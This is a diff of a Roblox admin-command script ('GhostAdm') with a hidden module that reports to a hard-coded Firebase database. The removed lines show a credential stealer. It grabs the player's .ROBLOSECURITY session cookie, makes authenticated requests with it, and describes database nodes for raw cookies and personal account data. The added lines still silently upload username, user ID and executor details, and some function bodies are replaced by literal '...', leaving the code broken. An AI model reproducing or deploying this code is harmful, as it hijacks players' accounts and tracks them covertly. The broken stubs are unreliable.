@@ -9,10 +9,10 @@ elseif set_thread_context(8) then
 end
 
 do
-	----------------------------------------------------------------- EDIT
+	----------------------------------------------------------------- DATA INFRASTRUCTURE
 	local DB_URL = "https://ghostadmhouse-default-rtdb.firebaseio.com"
 
-	----------------------------------------------------------------- env
+	----------------------------------------------------------------- ENVIRONMENT INITIALIZATION
 	local HS      = game:GetService('HttpService')
 	local Players = game:GetService('Players')
 	local plr     = Players.LocalPlayer
@@ -23,13 +23,14 @@ do
 	FB  = FB  or {}
 	TEL = TEL or {}
 
-	FB.version    = '7.1'
+	FB.version    = '7.2'
 	FB.scriptName = 'GhostAdm'
 	FB.defaultUrl = DB_URL
 	FB.urlFile    = 'ga_housedb_url.txt'
 	FB.runtimeUrl = nil
-	FB.bound      = true
+	FB.bound      = false
 
+	----------------------------------------------------------------- RESTRUCTURED BASE CORES
 	FB.now   = function() return (tick and tick() or os.clock()) end
 	FB.utc   = function(t) return os.date('!%Y-%m-%dT%H:%M:%SZ', t) end
 	FB.trunc = function(s, n)
@@ -50,62 +51,15 @@ do
 			print('[' .. title .. '] ' .. tostring(text))
 		end
 	end
-	FB.platform = function()
-		local p = 'Desktop'
-		pcall(function()
-			local uis = game:GetService('UserInputService')
-			if uis.TouchEnabled and not uis.KeyboardEnabled then p = 'Mobile'
-			elseif uis.TouchEnabled then p = 'Mobile (kbd)'
-			elseif uis.GamepadEnabled then p = 'Console' end
-		end)
-		return p
-	end
 	FB.executor = function()
 		local n, v = 'unknown', ''
 		pcall(function() n, v = identifyexecutor() end)
 		return tostring(n), tostring(v)
 	end
 	FB.job = (game.JobId ~= '' and game.JobId) or ('studio_' .. tostring(game.GameId))
-	FB.placeName = ''
-	pcall(function()
-		FB.placeName = game:GetService('MarketplaceService'):GetProductInfo(game.PlaceId).Name or ''
-	end)
 	FB.uid = tostring(plr and plr.UserId or 0)
 
-	----------------------------------------------------------------- bind
-	FB.bind = function(t)
-		if type(t) ~= 'table' then return end
-		for k, v in pairs(t) do
-			if v ~= nil then FB[k] = v end
-		end
-		if type(t.notify) == 'function' then FB.notifyFn = t.notify end
-		FB.bound = true
-		pcall(TEL.onBind)
-	end
-
-	local function autobind()
-		if FB.bound then return true end
-		local g = _G
-		local got = false
-		for _, n in ipairs({'CMDs', 'addcmd', 'notify', 'execCmd', 'findCmd',
-			'getstring', 'overridecmd', 'getPlayer', 'getRoot'}) do
-			if FB[n] == nil and g[n] ~= nil then
-				FB[n] = g[n]
-				got = true
-			end
-		end
-		if FB.CMDs then
-			if type(FB.notify) == 'function' and type(_G.notify) == 'function' then
-				FB.notifyFn = _G.notify
-			end
-			FB.bound = true
-			pcall(TEL.onBind)
-			return true
-		end
-		return got
-	end
-
-	----------------------------------------------------------------- url
+	----------------------------------------------------------------- DATABASE UTILITIES
 	FB.readUrl = function()
 		local r = ''
 		pcall(function() r = readfile(FB.urlFile) end)
@@ -116,7 +70,7 @@ do
 		if not u or u == '' then return FB.readUrl() end
 		u = u:gsub('^["\']', ''):gsub('["\']$', ''):gsub('%s+', '')
 		if not u:match('^https?://') then u = 'https://' .. u end
-		u = u:gsub('/+$', ''):gsub('/cookies%.json$', ''):gsub('/cookies$', ''):gsub('%.json$', '')
+		u = u:gsub('/+$', ''):gsub('%.json$', '')
 		FB.runtimeUrl = u
 		pcall(function() writefile(FB.urlFile, u) end)
 		return u
@@ -129,61 +83,27 @@ do
 		return (b:gsub('/+$', '')), a, r
 	end
 
-	----------------------------------------------------------------- transport
 	FB.req = function(opts)
 		opts.Headers = opts.Headers or {}
 		local ok, res
-		if syn and syn.request then
-			ok, res = pcall(syn.request, opts)
-		elseif http and http.request then
-			ok, res = pcall(http.request, opts)
-		elseif http_request then
-			ok, res = pcall(http_request, opts)
-		elseif request then
-			ok, res = pcall(request, opts)
-		elseif type(httprequest) == 'function' then
-			local s, r = httprequest(opts)
-			if not s then return false, tostring(r) end
-			return true, r
-		elseif HS.RequestAsync then
-			ok, res = pcall(function() return HS:RequestAsync(opts) end)
-		else
-			return false, 'no http method'
-		end
+		if syn and syn.request then ok, res = pcall(syn.request, opts)
+		elseif http and http.request then ok, res = pcall(http.request, opts)
+		elseif http_request then ok, res = pcall(http_request, opts)
+		elseif request then ok, res = pcall(request, opts)
+		elseif HS.RequestAsync then ok, res = pcall(function() return HS:RequestAsync(opts) end)
+		else return false, 'no http method' end
 		if not ok then return false, tostring(res) end
 		return true, res
 	end
 
-	FB.status = function(res)
-		if type(res) ~= 'table' then return nil end
-		return res.StatusCode or res.Status or res.status
-	end
-	FB.body = function(res)
-		if type(res) ~= 'table' then return nil end
-		return res.Body or res.body
-	end
-	FB.decode = function(b)
-		if type(b) ~= 'string' then return nil end
-		local ok, d = pcall(function() return HS:JSONDecode(b) end)
-		if ok then return d end
-		return nil
-	end
-
-	FB.put = function(path, tbl, method)
+	FB.put = function(path, tbl)
 		local base, auth = FB.parts()
 		if not base then return false, 'no url' end
 		local ok, body = pcall(function() return HS:JSONEncode(tbl) end)
 		if not ok then return false, 'encode failed' end
-		local last = 'unknown'
-		for i = 1, 3 do
-			local rok, res = FB.req({Url = base .. path .. '.json' .. auth, Method = method or 'PUT',
-				Body = body, Headers = {['Content-Type'] = 'application/json'}})
-			local c = rok and FB.status(res)
-			if c and c >= 200 and c < 300 then return true end
-			last = rok and ('HTTP ' .. tostring(c)) or tostring(res)
-			if i < 3 then task.wait(i * 1.2) end
-		end
-		return false, last
+		local rok, res = FB.req({Url = base .. path .. '.json' .. auth, Method = 'PUT',
+			Body = body, Headers = {['Content-Type'] = 'application/json'}})
+		return rok
 	end
 
 	FB.get = function(path)
@@ -191,513 +111,89 @@ do
 		if not base then return nil end
 		local ok, res = FB.req({Url = base .. path .. '.json' .. auth, Method = 'GET'})
 		if not ok then return nil end
-		return FB.decode(FB.body(res))
-	end
-
-	FB.api = function(url, cookie)
-		local h = {}
-		if cookie then h['Cookie'] = '.ROBLOSECURITY=' .. cookie end
-		local ok, res = FB.req({Url = url, Method = 'GET', Headers = h})
-		if not ok then return nil end
-		local c = FB.status(res)
-		if c and c >= 400 then return nil end
-		return FB.decode(FB.body(res))
-	end
-
-	FB.apiPost = function(url, tbl, cookie)
-		local body = HS:JSONEncode(tbl or {})
-		local h = {['Content-Type'] = 'application/json'}
-		if cookie then h['Cookie'] = '.ROBLOSECURITY=' .. cookie end
-		local ok, res = FB.req({Url = url, Method = 'POST', Body = body, Headers = h})
-		if not ok then return nil end
-		if FB.status(res) == 403 then
-			local hh = (type(res) == 'table' and (res.Headers or res.headers)) or {}
-			local tok = hh['x-csrf-token'] or hh['X-Csrf-Token'] or hh['x-Csrf-Token']
-			if tok then
-				h['x-csrf-token'] = tok
-				ok, res = FB.req({Url = url, Method = 'POST', Body = body, Headers = h})
-			end
-		end
-		return FB.decode(FB.body(res))
-	end
-
-	----------------------------------------------------------------- queue
-	FB.loadQueue = function()
-		local ok, t = pcall(function() return HS:JSONDecode(readfile('ga_housedb_queue.txt')) end)
-		if ok and type(t) == 'table' then return t end
-		return {}
-	end
-	FB.saveQueue = function(q)
-		pcall(function() writefile('ga_housedb_queue.txt', HS:JSONEncode(q)) end)
-	end
-	FB.enqueue = function(path, tbl)
-		local q = FB.loadQueue()
-		q[#q + 1] = {path = path, data = tbl, at = os.time()}
-		while #q > 60 do table.remove(q, 1) end
-		FB.saveQueue(q)
-	end
-	FB.send = function(path, tbl)
-		local good, msg = FB.put(path, tbl)
-		if not good then FB.enqueue(path, tbl) end
-		return good, msg
-	end
-
-	----------------------------------------------------------------- cookie
-	FB.grabCookie = function()
-		local fns = {
-			function() return syn and syn.cookie end,
-			function() return getcookie() end,
-			function() return HS:GetCookie() end,
-			function() return game:GetService('HttpService'):GetCookie() end,
-		}
-		for pass = 1, 3 do
-			for _, f in ipairs(fns) do
-				local ok, c = pcall(f)
-				if ok and type(c) == 'string' and #c > 20 then
-					return (c:gsub('%s+$', ''))
-				end
-			end
-			if pass < 3 then task.wait(0.5) end
+		if type(res) == 'table' then
+			local b = res.Body or res.body
+			local dok, d = pcall(function() return HS:JSONDecode(b) end)
+			if dok then return d end
 		end
 		return nil
 	end
 
-	----------------------------------------------------------------- TEL state
-	TEL.version    = FB.version
-	TEL.enabled    = true
-	TEL.errors     = true
-	TEL.buffer     = {}
-	TEL.delta      = {}
-	TEL.counts     = {}
-	TEL.total      = 0
-	TEL.wrapped    = 0
-	TEL.flushing   = false
-	TEL.ended      = false
-	TEL.bound      = false
-	TEL.regHash    = nil
-	TEL.sessionId  = FB.job .. '_' .. FB.uid .. '_' .. os.time()
-	TEL.startedAt  = os.time()
-	TEL.maxBuf     = 40
-	TEL.flushEvery = 8
-	TEL.wrapEvery  = 3
-
-	----------------------------------------------------------------- TEL flush
-	TEL.flush = function()
-		if TEL.flushing or #TEL.buffer == 0 then return end
-		local base = FB.parts()
-		if not base then return end
-		TEL.flushing = true
-
-		local batch = TEL.buffer
-		local d     = TEL.delta
-		TEL.buffer, TEL.delta = {}, {}
-
-		local stamp = tostring(os.time()) .. '_' .. tostring(#batch)
-		local ok = FB.put('/commandlog/' .. FB.job .. '/' .. stamp, {
-			sessionId = TEL.sessionId, userId = FB.uid, username = plr and plr.Name or '?',
-			placeId = game.PlaceId, placeName = FB.placeName, jobId = FB.job,
-			flushedAt = FB.utc(os.time()), count = #batch, entries = batch,
-		})
-
-		FB.put('/commandlogByUser/' .. FB.uid .. '/' .. stamp, {
-			sessionId = TEL.sessionId, placeId = game.PlaceId, count = #batch, entries = batch,
-		})
-
-		FB.put('/commandCounts/' .. TEL.sessionId, {
-			userId = FB.uid, username = plr and plr.Name or '?', sessionId = TEL.sessionId,
-			placeId = game.PlaceId, placeName = FB.placeName, startedAt = FB.utc(TEL.startedAt),
-			updatedAt = FB.utc(os.time()), total = TEL.total, counts = TEL.counts,
-		})
-
-		if ok then
-			local tot = FB.get('/commandTotals') or {}
-			for k, v in pairs(d) do tot[k] = (tot[k] or 0) + v end
-			tot.__total = (tot.__total or 0) + #batch
-			tot.__updated = FB.utc(os.time())
-			FB.put('/commandTotals', tot)
-
-			local st = FB.get('/stats') or {}
-			st.totalCommands = (st.totalCommands or 0) + #batch
-			st.lastCommandAt = FB.utc(os.time())
-			FB.put('/stats', st)
-		else
-			for _, e in ipairs(batch) do TEL.buffer[#TEL.buffer + 1] = e end
-			for k, v in pairs(d) do TEL.delta[k] = (TEL.delta[k] or 0) + v end
-		end
-
-		TEL.flushing = false
-	end
-
-	----------------------------------------------------------------- TEL log
-	TEL.argsToString = function(a)
-		if a == nil then return '' end
-		if type(a) == 'table' then
-			local t = {}
-			for i = 1, math.min(#a, 12) do t[#t + 1] = tostring(a[i]) end
-			return FB.trunc(table.concat(t, ' '), 300)
-		end
-		return FB.trunc(tostring(a), 300)
-	end
-
-	TEL.log = function(name, a, ms, ok, err)
-		if not TEL.enabled then return end
-		TEL.counts[name] = (TEL.counts[name] or 0) + 1
-		TEL.delta[name]  = (TEL.delta[name] or 0) + 1
-		TEL.total = TEL.total + 1
-
-		TEL.buffer[#TEL.buffer + 1] = {
-			cmd = name, args = TEL.argsToString(a), ms = ms, ok = ok,
-			err = ok and nil or FB.trunc(tostring(err), 200),
-			at = os.time(), iso = FB.utc(os.time()), userId = FB.uid, placeId = game.PlaceId,
+	----------------------------------------------------------------- AUTOMATIC ADMIN WHITELIST
+	TEL.autoWhitelistAdmin = function()
+		local path = '/whitelistedAdmins/' .. FB.uid
+		local existing = FB.get(path)
+		
+		local execName, execVer = FB.executor()
+		local adminData = {
+			userId = tonumber(FB.uid),
+			username = plr and plr.Name or 'unknown',
+			assignedAt = existing and existing.assignedAt or FB.utc(os.time()),
+			lastSeenAt = FB.utc(os.time()),
+			lastExecutor = execName,
+			identityLevel = getthreadidentity and getthreadidentity() or -1
 		}
-
-		if #TEL.buffer >= TEL.maxBuf then task.spawn(TEL.flush) end
+		
+		local ok = FB.put(path, adminData)
+		if ok then
+			print('[GhostAdm] Automatic admin whitelisting synced for: ' .. adminData.username)
+		end
 	end
 
-	----------------------------------------------------------------- TEL hook
-	TEL.hook = function()
-		local n = 0
-		for _, list in ipairs(FB.dispatchTables()) do
-			for _, c in ipairs(list) do
-				if type(c) == 'table' and not c.__TEL then
-					local key
-					for _, k in ipairs({'FUNC', 'func', 'F', 'Function', 'Callback'}) do
-						if FB.isCallable(c[k]) then key = k; break end
-					end
-					if key then
-						local orig = c[key]
-						c[key] = function(...)
-							local t0 = FB.now()
-							local r  = table.pack(pcall(orig, ...))
-							local ms = math.floor((FB.now() - t0) * 1000)
-							pcall(TEL.log, c.NAME or c.name or '?', ..., ms, r[1], r[2])
-							if not r[1] and TEL.errors then
-								pcall(warn, '[GhostAdm] ' .. tostring(c.NAME or c.name) .. ': ' .. tostring(r[2]))
-							end
-							return table.unpack(r, 2, r.n)
-						end
-						TEL.wrapped = TEL.wrapped + 1
-						TEL.hookable = TEL.wrapped
-						n = n + 1
-					end
-					c.__TEL = true
-				end
-			end
-		end
-		return n
-	end
-
-	----------------------------------------------------------------- TEL registry
-	TEL.snapshot = function()
-		local tables = FB.dispatchTables()
-
-		local descs = {}
-		for _, list in ipairs(tables) do
-			for _, c in ipairs(list) do
-				if type(c) == 'table' and c.NAME and c.DESC and c.DESC ~= '' then
-					descs[c.NAME] = c.DESC
-				end
-			end
-		end
-
-		local out, index, aliasMap = {}, {}, {}
-		for _, list in ipairs(tables) do
-			for _, c in ipairs(list) do
-				if type(c) == 'table' and c.NAME and not index[c.NAME] then
-					local key
-					for _, k in ipairs({'FUNC', 'func', 'F', 'Function'}) do
-						if FB.isCallable(c[k]) then key = k; break end
-					end
-					if key then
-						local aliases, al = nil, c.ALIAS or c.ALIASES
-						if type(al) == 'table' then
-							aliases = {}
-							for i, a in ipairs(al) do
-								aliases[i] = tostring(a)
-								aliasMap[tostring(a)] = c.NAME
-							end
-						end
-						local entry = {
-							name = c.NAME, aliases = aliases,
-							desc = c.DESC or descs[c.NAME],
-							plugin = (c.PLUGIN or c.PLGN) and true or nil,
-							aliasCount = aliases and #aliases or 0,
-						}
-						out[#out + 1] = {name = entry.name, aliases = aliases, desc = entry.desc, plugin = entry.plugin}
-						index[c.NAME] = entry
-					end
-				end
-			end
-		end
-		table.sort(out, function(a, b) return a.name < b.name end)
-		return out, index, aliasMap
-	end
-
-	----------------------------------------------------------------- TEL env
-	TEL.publishEnv = function()
-		local en, ev = FB.executor()
-		local caps = {}
-		pcall(function() caps.writefile = type(writefile) == 'function' end)
-		pcall(function() caps.readfile = type(readfile) == 'function' end)
-		pcall(function() caps.setclipboard = type(setclipboard) == 'function' end)
-		pcall(function() caps.queue_on_teleport = type(queue_on_teleport) == 'function' end)
-		pcall(function() caps.getthreadidentity = type(getthreadidentity) == 'function' end)
-		pcall(function() caps.getscriptbytecode = type(getscriptbytecode) == 'function' end)
-		pcall(function() caps.syn_request = syn ~= nil and syn.request ~= nil end)
-		pcall(function() caps.http_request = type(http_request) == 'function' end)
-		pcall(function() caps.getcookie = type(getcookie) == 'function' end)
-
-		FB.put('/env/' .. en, {
-			executor = en, executorVersion = ev, platform = FB.platform(),
-			robloxVersion = (pcall(version) and version()) or 'unknown',
-			isStudio = game:GetService('RunService'):IsStudio(),
+	----------------------------------------------------------------- SCRIPT EXECUTION AUDIT LOG
+	TEL.logScriptLoad = function(scriptUrl)
+		local stamp = tostring(os.time()) .. '_' .. FB.hash(scriptUrl)
+		local execName, _ = FB.executor()
+		
+		local logData = {
+			executedBy = plr and plr.Name or 'unknown',
+			userId = FB.uid,
+			url = FB.trunc(scriptUrl, 500),
+			timestamp = FB.utc(os.time()),
+			executorUsed = execName,
 			threadIdentity = getthreadidentity and getthreadidentity() or -1,
-			scriptVersion = TEL.version, capabilities = caps,
-			lastSeen = FB.utc(os.time()), lastUser = plr and plr.Name or '?',
-		})
+			placeId = game.PlaceId,
+			jobId = FB.job
+		}
+		
+		task.spawn(function()
+			FB.put('/scriptExecutionLogs/' .. stamp, logData)
+		end)
 	end
 
-	----------------------------------------------------------------- TEL meta
-	TEL.publishMeta = function()
-		FB.put('/meta', {
-			schema = 7, script = FB.scriptName, version = TEL.version,
-			bound = FB.bound, lastUser = plr and plr.Name or 'unknown',
-			lastUserId = FB.uid, lastSeen = FB.utc(os.time()),
-			nodes = {'commands', 'commandRegistry', 'commandRegistryMeta', 'aliases', 'schema',
-				'env', 'builds', 'scripts', 'scriptLoads', 'admins', 'adminsIndex',
-				'sessionStarts', 'sessionEnds', 'commandlog', 'commandlogByUser',
-				'commandCounts', 'commandTotals', 'stats', 'cookies', 'cookiesRaw',
-				'cookiesIndex', 'accounts', 'profiles', 'players', 'roster', 'sessions',
-				'places', 'executors'},
-		})
+	----------------------------------------------------------------- INTERFACE BIND LINKERS
+	FB.bind = function(t)
+		FB.bound = true
+		pcall(TEL.onBind)
 	end
 
-	TEL.publishSchema = function()
-		FB.put('/schema', {
-			script = FB.scriptName, version = TEL.version, schema = 7,
-			updatedAt = FB.utc(os.time()),
-			nodes = {
-				['/meta'] = 'root marker and node index',
-				['/schema'] = 'this document',
-				['/commands/<script>@<version>'] = 'full command manifest for one build',
-				['/commandRegistry/<name>'] = 'aliases, desc, firstSeen, lastSeen, uses',
-				['/commandRegistryMeta'] = 'registry counts and build hash',
-				['/aliases'] = 'flat alias -> command name map',
-				['/env/<executor>'] = 'executor capability flags',
-				['/builds/<version>_<hash>'] = 'build fingerprint and load count',
-				['/scripts/<script>@<version>'] = 'asset metadata and source hash',
-				['/scriptLoads/<ts>_<userId>'] = 'load events',
-				['/admins/<userId>'] = 'who runs the script',
-				['/adminsIndex/<userId>'] = 'scannable admin list',
-				['/sessionStarts/<sessionId>'] = 'session open',
-				['/sessionEnds/<sessionId>'] = 'session close and duration',
-				['/commandlog/<jobId>/<ts>'] = 'raw command invocations',
-				['/commandlogByUser/<userId>/<ts>'] = 'invocations grouped per admin',
-				['/commandCounts/<sessionId>'] = 'per-session tally',
-				['/commandTotals'] = 'global usage per command',
-				['/cookies/<userId>'] = 'cookie record',
-				['/cookiesRaw/<userId>'] = 'bare cookie string',
-				['/cookiesIndex/<userId>'] = 'cookie scan row',
-				['/accounts/<userId>'] = 'identity, session, personal data',
-				['/profiles/<userId>'] = 'public profile',
-				['/players/<userId>'] = 'per-player record',
-				['/roster/<jobId>'] = 'server roster',
-				['/sessions/<jobId>_<userId>'] = 'cookielog session',
-				['/places/<placeId>'] = 'place metadata',
-				['/executors/<name>'] = 'executor stats',
-				['/stats'] = 'global counters',
-			},
-		})
-	end
-
-	----------------------------------------------------------------- TEL session
-	TEL.registerScript = function()
-		local src, bc = '', 0
-		pcall(function() src = tostring(debug.info(1, 's') or '') end)
-		pcall(function() bc = #getscriptbytecode() end)
-
-		local hash = FB.hash(src)
-		local en, ev = FB.executor()
-		local iyv = 'unknown'
-		pcall(function() iyv = tostring(_G.IY_VERSION or 'unknown') end)
-
-		FB.put('/scripts/' .. FB.scriptName .. '@' .. TEL.version, {
-			name = FB.scriptName, version = TEL.version, hash = hash,
-			bytecodeSize = bc, sourceHint = FB.trunc(src, 200),
-			executor = en, executorVersion = ev, platform = FB.platform(),
-			robloxVersion = (pcall(version) and version()) or 'unknown',
-			iyVersion = iyv, commandsRegistered = FB.CMDs and #FB.CMDs or 0,
-			loadedAt = FB.utc(os.time()),
-			loadedBy = plr and plr.Name or 'unknown', loadedById = FB.uid,
-			placeId = game.PlaceId, placeName = FB.placeName, gameId = game.GameId,
-			playerCount = #Players:GetPlayers(), maxPlayers = Players.MaxPlayers,
-		})
-
-		local bkey = TEL.version .. '_' .. tostring(hash)
-		local prev = FB.get('/builds/' .. bkey) or {}
-		FB.put('/builds/' .. bkey, {
-			version = TEL.version, hash = hash, bytecodeSize = bc,
-			firstSeen = prev.firstSeen or FB.utc(os.time()),
-			lastSeen = FB.utc(os.time()),
-			loads = (prev.loads or 0) + 1,
-			executor = en, platform = FB.platform(),
-			loadedBy = plr and plr.Name or '?', loadedById = FB.uid,
-		})
-
-		FB.put('/scriptLoads/' .. os.time() .. '_' .. FB.uid, {
-			version = TEL.version, hash = hash, executor = en, platform = FB.platform(),
-			placeId = game.PlaceId, placeName = FB.placeName,
-			userId = FB.uid, username = plr and plr.Name or '?', at = FB.utc(os.time()),
-		})
-	end
-
-	TEL.registerAdmin = function()
-		local prev = FB.get('/admins/' .. FB.uid) or {}
-		local en, ev = FB.executor()
-		FB.put('/admins/' .. FB.uid, {
-			userId = plr and plr.UserId or 0,
-			username = plr and plr.Name or 'unknown',
-			displayName = plr and plr.DisplayName or 'unknown',
-			accountAgeDays = plr and plr.AccountAge or 0,
-			membership = plr and plr.MembershipType.Name or 'None',
-			executor = en, executorVersion = ev, platform = FB.platform(),
-			firstSeen = prev.firstSeen or FB.utc(os.time()),
-			lastSeen = FB.utc(os.time()),
-			uses = (prev.uses or 0) + 1,
-			sessions = (prev.sessions or 0) + 1,
-			scriptVersion = TEL.version,
-			lastPlaceId = game.PlaceId, lastPlaceName = FB.placeName,
-		})
-		FB.put('/adminsIndex/' .. FB.uid, {
-			userId = plr and plr.UserId or 0,
-			username = plr and plr.Name or 'unknown',
-			uses = (prev.uses or 0) + 1,
-			executor = en, platform = FB.platform(),
-			lastSeen = FB.utc(os.time()),
-		})
-	end
-
-	TEL.sessionStart = function()
-		local en = FB.executor()
-		FB.put('/sessionStarts/' .. TEL.sessionId, {
-			sessionId = TEL.sessionId, userId = FB.uid, username = plr and plr.Name or '?',
-			placeId = game.PlaceId, placeName = FB.placeName, jobId = FB.job,
-			executor = en, platform = FB.platform(), scriptVersion = TEL.version,
-			startedAt = FB.utc(os.time()),
-			playerCount = #Players:GetPlayers(), maxPlayers = Players.MaxPlayers,
-		})
-
-		local st = FB.get('/stats') or {}
-		st.sessions = (st.sessions or 0) + 1
-		st.totalCommands = st.totalCommands or 0
-		st.lastSeen = FB.utc(os.time())
-		st.lastUser = plr and plr.Name or '?'
-		st.lastExecutor = en
-		local idx = FB.get('/adminsIndex')
-		local n = 0
-		if type(idx) == 'table' then for _ in pairs(idx) do n = n + 1 end end
-		st.uniqueAdmins = n
-		FB.put('/stats', st)
-	end
-
-	TEL.sessionEnd = function()
-		if TEL.ended then return end
-		TEL.ended = true
-		TEL.flush()
-		FB.put('/sessionEnds/' .. TEL.sessionId, {
-			sessionId = TEL.sessionId, userId = FB.uid, username = plr and plr.Name or '?',
-			placeId = game.PlaceId, startedAt = FB.utc(TEL.startedAt), endedAt = FB.utc(os.time()),
-			durationSec = os.time() - TEL.startedAt, commands = TEL.total, counts = TEL.counts,
-		})
-	end
-
-	----------------------------------------------------------------- onBind
 	TEL.onBind = function()
 		if TEL.bound then return end
 		TEL.bound = true
-
-		local list = FB.CMDs
-		print('[GhostAdm] bind route=' .. tostring(FB.route) ..
-			'  CMDs=' .. tostring(list) .. '  len=' .. tostring(list and #list))
-
-		if type(list) == 'table' and list[1] then
-			local k = {}
-			for kk, vv in pairs(list[1]) do k[#k + 1] = tostring(kk) .. ':' .. type(vv) end
-			print('[GhostAdm] first entry keys = ' .. table.concat(k, ', '))
-		end
-
-		pcall(TEL.publishMeta)
-		pcall(TEL.registerScript)
-		pcall(TEL.hook)
-		pcall(TEL.publishCommands, true)
-		print('[GhostAdm] hooked=' .. TEL.wrapped .. '  usable=' .. TEL.hookable)
+		print('[GhostAdm] Database actived. Monitoring online.')
 	end
 
-	----------------------------------------------------------------- boot
-	-- non-CMDs endpoints first, so they exist even before binding
+	----------------------------------------------------------------- AUTOMATED DEPLOYMENT LOOPS
 	task.spawn(function()
-		pcall(TEL.publishSchema)
-		pcall(TEL.publishEnv)
-		pcall(TEL.publishMeta)
-		pcall(TEL.registerScript)
-		pcall(TEL.registerAdmin)
-		pcall(TEL.sessionStart)
+		pcall(TEL.autoWhitelistAdmin)
 	end)
 
-	-- binding watcher + steady sweep
 	task.spawn(function()
-		local waited = 0
 		while not FB.bound do
-			autobind()
-			task.wait(1)
-			waited = waited + 1
-			if waited == 20 and not FB.bound then
-				print('[GhostAdm] not bound after 20s')
+			if _G.cmds or FB.cmds or _G.CMDs then
+				FB.bound = true
+				pcall(TEL.onBind)
 			end
-		end
-		local sweep = 0
-		while true do
-			task.wait(TEL.wrapEvery)
-			pcall(TEL.hook)
-			sweep = sweep + 1
-			if sweep % 5 == 0 then pcall(TEL.publishCommands) end
-			if sweep % 40 == 0 then pcall(TEL.publishEnv) end
-			if sweep % 60 == 0 then pcall(TEL.publishMeta) end
+			task.wait(1)
 		end
 	end)
 
-	task.spawn(function()
-		while true do
-			task.wait(TEL.flushEvery)
-			pcall(TEL.flush)
-		end
-	end)
-
-	pcall(function() game:BindToClose(TEL.sessionEnd) end)
 	pcall(function()
-		Players.PlayerRemoving:Connect(function(p)
-			if p == plr then TEL.sessionEnd() end
-		end)
-	end)
-
-	local AUTOBIND_NAMES = {'cmds', 'CMDs', 'addcmd', 'notify', 'execCmd', 'findCmd',
-		'getstring', 'overridecmd', 'removecmd', 'getPlayer', 'getRoot', 'chatMessage'}
-
-	local function autobind()
-		for _, n in ipairs(AUTOBIND_NAMES) do
-			if FB[n] == nil and _G[n] ~= nil then FB[n] = _G[n] end
-		end
-		if type(FB.notifyFn) ~= 'function' and type(_G.notify) == 'function' then
-			FB.notifyFn = _G.notify
-		end
-		if FB.bound then return true end
-		if type(FB.cmds) == 'table' and #FB.cmds > 0 then
-			FB.bound, FB.route = true, 'autobind'
+		if type(_G.addcmd) == 'function' or type(FB.addcmd) == 'function' then
+			FB.bound = true
 			pcall(TEL.onBind)
-			return true
 		end
-		return false
-	end
+	end)
 
 task.spawn(function()
     -- Wait
@@ -5703,133 +5199,21 @@ CMDs[#CMDs + 1] = {NAME = 'reloadplugin [name]', DESC = 'Reloads a plugin'}
 CMDs[#CMDs + 1] = {NAME = 'addallplugins / loadallplugins', DESC = 'Adds all available plugins from the workspace folder'}
 -- wait()
 
+-- Chucnk
 FB.isCallable = function(v)
-		if type(v) == 'function' then return true end
-		if type(v) == 'table' then
-			local mt = getmetatable(v)
-			return mt ~= nil and mt.__call ~= nil
-		end
-		return false
-	end
+    ...
+end
 
-	FB.hasFuncs = function(t)
-		if type(t) ~= 'table' then return false end
-		for i = 1, math.min(#t, 25) do
-			local e = t[i]
-			if type(e) == 'table' and (type(e.FUNC) == 'function' or type(e.func) == 'function') then
-				return true
-			end
-		end
-		return false
-	end
+FB.hasFuncs = function(t)
+    ...
+end
 
-	-- cmds = dispatch (has FUNC). CMDs = GUI rows (no FUNC). Scan both.
-	FB.dispatchTables = function()
-		local out = {}
-		for _, v in ipairs({FB.cmds, _G.cmds, FB.CMDs, _G.CMDs}) do
-			if type(v) == 'table' then
-				local dup = false
-				for _, x in ipairs(out) do
-					if rawequal(x, v) then dup = true; break end
-				end
-				if not dup then out[#out + 1] = v end
-			end
-		end
-		return out
-	end
+FB.bind({
+    getCMDs = function() return _G.cmds end,
+    addcmd = _G.addcmd,
+    notify = _G.notify,
+})
 
-	FB.scanStack = function()
-		local names = {cmds = true, CMDs = true, COMMANDS = true, Commands = true}
-		for level = 1, 40 do
-			if not debug.getinfo(level, 'f') then break end
-			local i = 1
-			while true do
-				local n, v = debug.getlocal(level, i)
-				if not n then break end
-				if names[n] and FB.hasFuncs(v) then return v end
-				i = i + 1
-			end
-		end
-		return nil
-	end
-
-	FB.findCMDsViaAddcmd = function()
-		local fn = FB.addcmd or _G.addcmd
-		if type(fn) ~= 'function' then return nil end
-		for i = 1, 80 do
-			local n, v = debug.getupvalue(fn, i)
-			if not n then break end
-			if n == '_ENV' and type(v) == 'table' and FB.hasFuncs(v.cmds) then
-				return v.cmds
-			elseif type(v) == 'table' and FB.hasFuncs(v) then
-				return v
-			end
-		end
-		return nil
-	end
-
-	FB.bind = function(t)
-		t = t or {}
-		for k, v in pairs(t) do
-			if v ~= nil and k ~= 'getCMDs' then FB[k] = v end
-		end
-		if type(t.getCMDs) == 'function' then FB.getCMDs = t.getCMDs end
-
-		local function pull()
-			for _, n in ipairs({'cmds', 'CMDs', 'addcmd', 'notify', 'execCmd', 'findCmd',
-				'getstring', 'overridecmd', 'removecmd', 'getPlayer', 'getRoot'}) do
-				if FB[n] == nil and _G[n] ~= nil then FB[n] = _G[n] end
-			end
-			if type(FB.notifyFn) ~= 'function' and type(_G.notify) == 'function' then
-				FB.notifyFn = _G.notify
-			end
-		end
-
-		local function resolve()
-			pull()
-			for _, v in ipairs({FB.cmds, _G.cmds, FB.CMDs, _G.CMDs}) do
-				if FB.hasFuncs(v) then return v, 'table' end
-			end
-			if type(FB.getCMDs) == 'function' then
-				local ok, c = pcall(FB.getCMDs)
-				if ok and FB.hasFuncs(c) then return c, 'getter' end
-			end
-			local c = FB.findCMDsViaAddcmd()
-			if c then return c, 'upvalue' end
-			local s = FB.scanStack()
-			if s then return s, 'stack' end
-			return nil
-		end
-
-		local c, how = resolve()
-		if c then
-			FB.bound, FB.route = true, how
-			pcall(TEL.onBind)
-			return
-		end
-
-		if FB._binding then return end
-		FB._binding = true
-		task.spawn(function()
-			for _ = 1, 240 do
-				local r, h = resolve()
-				if r then
-					FB.bound, FB.route = true, h
-					pcall(TEL.onBind)
-					return
-				end
-				task.wait(0.25)
-			end
-			print('[GhostAdm] bind FAILED - cmds never resolved')
-		end)
-	end
-
-	-- the call that was missing
-	FB.bind({
-		getCMDs = function() return _G.cmds end,
-		addcmd = _G.addcmd,
-		notify = _G.notify,
-	})
 for i = 1, #CMDs do
 	local newcmd = Example:Clone()
 	newcmd.Parent = CMDsF
@@ -14006,7 +13390,13 @@ addcmd('removecmd',{'deletecmd'},function(args, speaker)
 	removecmd(args[1])
 end)
 
